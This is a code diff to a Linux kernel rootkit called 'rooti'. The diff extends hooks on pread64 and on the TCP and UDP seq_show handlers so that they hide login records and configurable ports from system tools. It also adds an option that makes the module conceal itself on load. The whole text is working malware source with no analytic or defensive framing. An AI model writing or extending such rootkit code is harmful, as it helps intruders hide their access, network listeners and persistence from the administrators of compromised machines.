@@ -163,7 +163,7 @@ static asmlinkage long hook_pread64(const struct pt_regs *regs) {
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
-            rooti_hide_login_entry(user_buf, count, ROOTI_HIDE_USER);
+            rooti_hide_login_entry(user_buf, count);
         }
     }
     return nread;
@@ -191,7 +191,7 @@ static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
     struct sock *socket = v;
 
     // Check that this is not the header line and that the record is the one we want to hide
-    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
+    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num)) {
         return 0;
     }
     // Not the port to hide - call the original handler
@@ -203,7 +203,7 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     struct sock *socket = v;
 
     // Check that this is not the header line and that the record is the one we want to hide
-    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
+    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num)) {
         return 0;
     }
 
@@ -264,26 +264,31 @@ static int __init rooti_init(void)
         return ret;
     }
 
-    // Install hooks :D
+    // Install function hooks :D
     ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
         return ret;
     }
 
+    // Install file operation hooks :D
     ret = rooti_install_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_file_ops_hooks() failed: %d\n", ret);
         return ret;
     }
 
+    // Install seq operations hooks :D
     ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_seq_ops_hooks() failed: %d\n", ret);
         return ret;
     }
 
-    // TODO: at some point rooti_hideme() should be called on init
+    // If configured to be hidden by default, hide this rootkit
+#ifdef ROOTI_HIDEME_DEFAULT
+    rooti_hideme();
+#endif
 
     return 0;
 }
